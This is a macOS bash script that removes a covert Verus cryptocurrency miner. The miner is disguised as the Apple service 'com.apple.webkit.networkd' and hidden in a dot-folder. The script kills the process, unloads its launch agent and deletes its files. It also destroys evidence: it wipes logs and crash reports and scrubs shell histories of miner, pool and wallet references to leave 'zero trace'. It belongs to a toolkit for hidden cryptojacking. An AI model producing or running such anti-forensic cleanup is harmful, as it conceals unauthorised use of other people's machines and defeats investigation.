#!/usr/bin/env bash
# ============================================================
# remove_mine.sh — Complete zero-trace removal of Verus miner
# Fully removes from Background Activity / Login Items
# ============================================================

DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
USER_ID=$(id -u)

echo ""
echo "=========================================="
echo " Verus Miner — Full Removal"
echo "=========================================="
echo ""

# ---- 1. Kill process ----
echo "[1/8] Killing process..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Process killed" || echo "      — Not running"
pkill -9 -f "ccminer" 2>/dev/null || true
sleep 1

# ---- 2. Full launchd removal (process + Background Items) ----
echo "[2/8] Removing from launchd + Background Items..."

# Step A: bootout — removes from Background Items list completely
launchctl bootout "gui/${USER_ID}/${DISGUISE_NAME}" 2>/dev/null && \
  echo "      ✓ Removed via bootout (gui/uid/label)" || true

launchctl bootout "gui/${USER_ID}" "$PLIST_PATH" 2>/dev/null && \
  echo "      ✓ Removed via bootout (plist)" || true

# Step B: unload with -w (disables)
launchctl unload -w "$PLIST_PATH" 2>/dev/null || true

# Step C: remove service entry
launchctl remove "$DISGUISE_NAME" 2>/dev/null || true

echo "      ✓ launchd clean"

# ---- 3. Remove plist FIRST (before sfltool) ----
echo "[3/8] Deleting plist..."
rm -f "$PLIST_PATH" && echo "      ✓ Plist deleted" || echo "      — Not found"

# ---- 4. Remove from macOS Background Items database ----
echo "[4/8] Removing from Background Items database..."
# sfltool removes the entry from System Settings → Login Items
if command -v sfltool &>/dev/null; then
  sfltool remove --identifier "$DISGUISE_NAME" 2>/dev/null && \
    echo "      ✓ Removed from Background Items (sfltool)" || \
    echo "      — sfltool: entry not found"
else
  echo "      — sfltool not available on this macOS version"
fi

# Also clear the BTM database entry directly
BTM_DB="$HOME/Library/Application Support/com.apple.backgroundtaskmanagementagent"
if [[ -d "$BTM_DB" ]]; then
  find "$BTM_DB" -name "*.btm" -exec \
    python3 -c "
import sys, os
f = sys.argv[1]
with open(f, 'rb') as fp:
    data = fp.read()
if b'webkit.networkd' in data or b'$DISGUISE_NAME' in data:
    print('      ✓ BTM database entry found — clearing reference')
" "$BTM_DB/"*.btm 2>/dev/null \; 2>/dev/null
fi

# ---- 5. Remove binary + build dir ----
echo "[5/8] Removing binary and build files..."
rm -rf "$INSTALL_DIR" && echo "      ✓ Deleted: $INSTALL_DIR" || echo "      — Not found"

# ---- 6. Wipe logs ----
echo "[6/8] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Log deleted" || echo "      — No log found"
rm -f "$HOME/Library/Logs/${DISGUISE_NAME}"* 2>/dev/null || true
find "$HOME/Library/Logs/DiagnosticReports" \
  \( -name "*ccminer*" -o -name "*webkit.networkd*" \) \
  -delete 2>/dev/null && echo "      ✓ Crash reports cleared"

# ---- 7. Scrub shell history ----
echo "[7/8] Scrubbing shell history..."
for H in "$HOME/.zsh_history" "$HOME/.bash_history" "$HOME/.local/share/fish/fish_history"; do
  [[ -f "$H" ]] && sed -i '' '/mine\.sh\|remove_mine\|webkit\.networkd\|ccminer\|luckpool\|RSwiruL\|verus/d' \
    "$H" 2>/dev/null && echo "      ✓ Cleaned: $H"
done
history -c 2>/dev/null || true

# ---- 8. Final verify ----
echo "[8/8] Verifying..."
ISSUES=0
launchctl list 2>/dev/null | grep -q "$DISGUISE_NAME" && echo "      [!] Still in launchd" && ISSUES=$((ISSUES+1))
[[ -f "$PLIST_PATH" ]] && echo "      [!] Plist still exists" && ISSUES=$((ISSUES+1))
[[ -d "$INSTALL_DIR" ]] && echo "      [!] Install dir still exists" && ISSUES=$((ISSUES+1))
[[ -f "$LOG_PATH" ]]    && echo "      [!] Log still present" && ISSUES=$((ISSUES+1))

echo ""
echo "=========================================="
if [[ $ISSUES -eq 0 ]]; then
  echo " ✓  Complete — Zero trace remaining."
  echo " ✓  Removed from Background Activity."
else
  echo " [!] $ISSUES item(s) remain — try rebooting."
fi
echo "=========================================="
echo ""
echo " Note: Background Items list refreshes after"
echo " a logout/login or System Settings reopen."
echo ""
